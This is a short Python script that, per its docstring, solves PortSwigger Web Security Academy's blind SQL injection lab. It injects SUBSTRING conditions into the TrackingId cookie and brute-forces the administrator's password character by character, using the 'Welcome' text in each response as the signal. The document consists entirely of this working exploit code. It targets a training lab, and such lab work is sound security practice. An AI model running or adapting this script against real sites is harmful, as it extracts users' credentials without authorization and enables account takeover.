#!/usr/bin/env python3
"""
This program was written to solve:
"Lab: Blind SQL injection with conditional responses" in PortSwigger's Web Security Academy
"""
import re
import string
import sys
import requests

def get_sqli(tracking_id, position, character):
    return tracking_id+"'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),"+str(position)+",1)='"+str(character)+"'+--" 
print("Starting program")

if len(sys.argv) != 2:
    print("Usage: main.py http://example.url")
url = sys.argv[1]

cookie_request_response = requests.get(url)

if cookie_request_response.status_code != 200:
    print("Request for obtaining the cookie failed. With Status code: " + str(cookie_request_response.status_code))

cookies_dict = cookie_request_response.cookies.get_dict()
tracking_id = cookies_dict["TrackingId"]
# session = cookies_dict["session"]

password = ""
for i in range(1,21):
    for c in string.ascii_lowercase +string.digits:
        print("\rTrying position " + str(i) + " and char " + str(c), end="")
        cookies_dict["TrackingId"] = get_sqli(tracking_id, i,c)
        resp = requests.get(url, cookies=cookies_dict)
        resp.close()
        html = str(resp.content)
        match =re.match(".*Welcome.*",html)
        if match is not None:
            password = password + str(c)
            print("\n" + password)
            break

print("PASSWORD: "+password)
        

